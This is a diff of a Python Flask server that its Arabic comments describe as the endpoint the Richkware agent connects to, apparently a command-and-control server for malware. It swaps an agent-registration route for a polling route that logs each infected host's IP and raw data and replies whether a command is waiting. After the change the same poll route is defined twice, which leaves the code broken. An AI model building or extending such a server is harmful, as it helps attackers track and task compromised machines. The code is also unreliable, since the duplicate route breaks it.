@@ -35,35 +35,35 @@ def encrypt_data(data):
     return data
 
 # ==================== نقطة النهاية اللي Richkware يتصل بها ====================
-@app.route('/api/v1/agent/register', methods=['POST'])
-def register_agent():
-    """الوكيل يسجل نفسه أول مرة"""
+@app.route('/api/v1/agent/poll', methods=['POST'])
+def poll_commands():
     try:
-        data = request.get_json()
+        # طباعة كل ما يصلنا لنفهمه
+        print(f"\n[!] Incoming Poll from: {request.remote_addr}")
         
-        agent_id = data.get('agent_id', 'unknown')
-        public_key = data.get('public_key', '')
-        system_info = data.get('system_info', {})
-        
-        # سجل الوكيل
+        # محاولة قراءة البيانات حتى لو لم تكن JSON
+        raw_data = request.get_data()
+        print(f"[*] Raw Data received: {raw_data}")
+
+        # استخراج agent_id بطريقة مرنة
+        data = request.get_json(silent=True) or {}
+        agent_id = data.get('agent_id', 'unknown_agent')
+
+        # تحديث بيانات الجهاز
         agents[agent_id] = {
-            'first_seen': datetime.now().isoformat(),
-            'last_seen': datetime.now().isoformat(),
-            'system_info': system_info,
-            'public_key': public_key,
-            'ip': request.remote_addr
+            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'ip': request.remote_addr,
+            'status': 'Online'
         }
-        
-        # رد بالتسجيل الناجح
-        response = {
-            'status': 'registered',
-            'session_id': hashlib.md5(f"{agent_id}{time.time()}".encode()).hexdigest(),
+
+        # الرد الافتراضي (Richkware يتوقع JSON)
+        return jsonify({
+            'has_command': False,
             'server_time': datetime.now().isoformat()
-        }
-        
-        return jsonify(response), 200
-        
+        }), 200
+
     except Exception as e:
+        print(f"[-] Error in Poll: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/v1/agent/poll', methods=['POST'])
